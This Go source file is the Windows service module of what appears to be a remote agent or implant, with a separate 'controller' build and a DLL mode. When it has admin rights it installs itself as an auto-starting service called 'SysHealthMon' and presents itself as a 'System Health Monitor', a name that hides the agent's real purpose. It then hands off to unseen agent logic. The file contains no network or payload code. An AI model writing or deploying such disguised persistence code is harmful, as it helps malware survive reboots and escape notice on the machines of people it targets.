//go:build windows && !controller && !noservice
// +build windows,!controller,!noservice

package main

import (
	"fmt"
	"os"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

const (
	ServiceName = "SysHealthMon"
	ServiceDisp = "System Health Monitor"
	ServiceDesc = "Provides system health monitoring and reporting services."
)

func daemonize(runFunc func()) {
	// 0. If running as DLL, skip daemonization/service logic
	if IsDLL {
		runFunc()
		return
	}

	// 1. Check if running as a Windows Service
	isService, err := svc.IsWindowsService()
	if err == nil && isService {
		IsServiceMode = true
		runService(runFunc)
		return
	}

	// 2. Check if Admin
	if isAdmin() {
		// If Admin, try to install/start service
		exePath, err := os.Executable()
		if err != nil {
			runFunc() // Fallback
			return
		}

		// Check if service exists
		m, err := mgr.Connect()
		if err != nil {
			runFunc() // Fallback
			return
		}
		defer m.Disconnect()

		s, err := m.OpenService(ServiceName)
		if err == nil {
			// Service exists, check status
			status, err := s.Query()
			s.Close()
			if err == nil && status.State == svc.Running {
				// Already running, exit this process
				os.Exit(0)
			}
			// Not running, try to start
			if err := startService(ServiceName); err == nil {
				os.Exit(0)
			}
		} else {
			// Service does not exist, install it
			if err := installService(ServiceName, ServiceDisp, exePath); err == nil {
				startService(ServiceName)
				os.Exit(0)
			}
		}
	}

	// 3. Fallback: Run normally (foreground/background depending on build)
	// If not admin, or failed to install service, just run the agent logic
	runFunc()
}

func isAdmin() bool {
	var sid *windows.SID

	// Although this looks huge, it's the standard way to check for admin rights in Go on Windows
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)

	token := windows.Token(0)
	member, err := token.IsMember(sid)
	if err != nil {
		return false
	}
	return member
}

func installService(name, desc, exepath string) error {
	m, err := mgr.Connect()
	if err != nil {
		return err
	}
	defer m.Disconnect()

	s, err := m.OpenService(name)
	if err == nil {
		s.Close()
		return fmt.Errorf("service %s already exists", name)
	}

	s, err = m.CreateService(name, exepath, mgr.Config{
		DisplayName: desc,
		StartType:   mgr.StartAutomatic,
		Description: ServiceDesc,
	})
	if err != nil {
		return err
	}
	defer s.Close()
	return nil
}

func startService(name string) error {
	m, err := mgr.Connect()
	if err != nil {
		return err
	}
	defer m.Disconnect()

	s, err := m.OpenService(name)
	if err != nil {
		return err
	}
	defer s.Close()
	return s.Start()
}

// Service Implementation
type agentService struct {
	runFunc func()
}

func (m *agentService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown
	changes <- svc.Status{State: svc.StartPending}
	
	// Start the agent logic in a goroutine
	go m.runFunc()
	
	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}

	for {
		c := <-r
		switch c.Cmd {
		case svc.Interrogate:
			changes <- c.CurrentStatus
		case svc.Stop, svc.Shutdown:
			changes <- svc.Status{State: svc.StopPending}
			return
		default:
			// unexpected control request #
		}
	}
	return
}

func runService(runFunc func()) {
	svc.Run(ServiceName, &agentService{runFunc: runFunc})
	os.Exit(0)
}
